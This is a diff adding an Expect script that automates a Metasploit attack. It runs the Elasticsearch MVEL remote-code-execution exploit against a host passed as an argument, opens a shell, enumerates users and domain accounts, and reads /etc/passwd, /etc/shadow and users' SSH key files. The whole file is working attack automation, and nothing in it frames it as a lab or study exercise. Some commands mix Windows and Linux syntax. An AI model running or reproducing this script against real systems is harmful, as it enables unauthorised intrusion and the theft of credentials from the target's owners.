@@ -1,0 +1,30 @@
+#!/usr/bin/expect -f
+
+set firstArg [lindex $argv 0]
+
+spawn msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $firstArg; exploit;"
+expect "Meterpreter>"
+send "shell\r"
+expect "Command Prompt>"
+send "whoami\r"
+expect "Command Prompt>"
+send "net user\r"
+expect "Command Prompt>"
+send "net user /domain\r"
+expect "Command Prompt>"
+send "ls\r"
+expect "Command Prompt>"
+send "ls /home\r"
+expect "Command Prompt>"
+send "cat /etc/passwd\r"
+expect "Command Prompt>"
+send "cat /etc/shadow\r"
+expect "Command Prompt>"
+send "sudo cat /home/*/.ssh/id_rsa.pub\r"
+expect "Command Prompt>"
+send "exit\r"
+expect "Command Prompt>"
+send "exit\r"
+expect "Command Prompt>"
+send "exit -y\r"
+interact
